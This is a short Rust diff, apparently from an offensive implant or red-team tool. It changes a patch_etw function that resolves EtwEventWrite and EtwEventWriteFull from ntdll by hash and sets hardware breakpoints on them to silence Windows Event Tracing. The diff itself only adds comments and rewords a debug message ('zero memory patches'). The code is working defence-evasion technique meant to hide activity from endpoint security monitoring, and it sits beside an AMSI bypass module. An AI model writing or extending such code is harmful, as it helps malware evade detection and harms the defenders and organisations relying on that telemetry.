@@ -11,6 +11,7 @@ pub unsafe fn patch_etw() -> bool {
 
         let mut patched = 0u32;
 
+        // DR1: EtwEventWrite (primary ETW logging function)
         let etw_write = resolver::ldr_function_by_hash(ntdll, hashes::ETWEVENTWRITE_HASH);
         if !etw_write.is_null() {
             if amsi::set_hardware_breakpint(2, etw_write as usize) {
@@ -19,6 +20,7 @@ pub unsafe fn patch_etw() -> bool {
             }
         }
 
+        // DR2: EtwEventWriteFull (extended ETW logging)
         let etw_write_full = resolver::ldr_function_by_hash(ntdll, hashes::ETWEVENTWRITEFULL_HASH);
         if !etw_write_full.is_null() {
             if amsi::set_hardware_breakpint(2, etw_write_full as usize) {
@@ -27,7 +29,7 @@ pub unsafe fn patch_etw() -> bool {
             }
         }
 
-        debug!("[ETW] Hardware breakpints set: {}/2", patched);
+        debug!("[ETW] Hardware breakpints set: {}/2 - zero memory patches", patched);
         patched > 0
     }
 }
